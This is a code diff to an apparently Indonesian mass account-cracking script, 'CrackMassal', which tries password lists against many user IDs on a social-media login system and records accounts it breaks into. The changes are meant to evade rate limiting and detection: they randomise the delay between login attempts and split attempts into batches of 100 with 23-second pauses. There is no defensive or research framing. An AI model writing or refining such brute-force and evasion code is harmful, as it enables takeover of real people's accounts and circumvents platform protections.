@@ -100,7 +100,7 @@ class CrackMassal:
     def login(self, uid, name, pw):
         if uid in self.cracked_uids:
             return
-        time.sleep(2.5)
+        time.sleep(random.uniform(3, 7))
         try:
             m = BloksIdentityEngine()
             pwd_encoded = self.enc.generate_pwd_enc(pw)
@@ -164,7 +164,7 @@ class CrackMassal:
             pil_metode = 1
         print(f"[*] Menggunakan Metode: {pil_metode}")
         if pil_metode == 3:
-            pw_input = input(f"{P}[?] Masukkan Suffix Custom (misal: gans,007,cakep): ")
+            pw_input = input(f"{P}[?] Masukkan Password Custom (misal: gans,007,cakep): ")
         else:
             pw_input = input(f"{P}[?] Masukkan Password Tambahan (Opsional, pisahkan koma): ")
         self.passwords = [p.strip() for p in pw_input.split(",") if p.strip()]
@@ -182,9 +182,18 @@ class CrackMassal:
         total_check = len(tasks)
         print(f"{P}[*] Total kombinasi password yang akan diproses: {total_check}")
         print(f"{P}[*] Tekan CTRL+C untuk stop.\n")
-        with ThreadPoolExecutor(max_workers=limit) as executor:
-            for uid, name, pw in tasks:
-                executor.submit(self.login, uid, name, pw)
+        batch_size = 100
+        for i in range(0, len(tasks), batch_size):
+            batch = tasks[i:i + batch_size]
+            batch_num = (i // batch_size) + 1
+            total_batch = (len(tasks) + batch_size - 1) // batch_size
+            print(f"\r{P}[*] Batch {batch_num}/{total_batch} ({len(batch)} task)...")
+            with ThreadPoolExecutor(max_workers=limit) as executor:
+                for uid, name, pw in batch:
+                    executor.submit(self.login, uid, name, pw)
+            if i + batch_size < len(tasks):
+                print(f"\n{K}[*] Jeda 23 detik sebelum batch berikutnya...{P}")
+                time.sleep(23)
         print(f"\n\n{I}[ DONE / SELESAI ]")
         print(f"{I}[+] Akun OK: {self.ok} ( hasil disimpan di Results/OK.txt )")
         print(f"{K}[+] Akun CP: {self.cp} ( hasil disimpan di Results/CP.txt )")
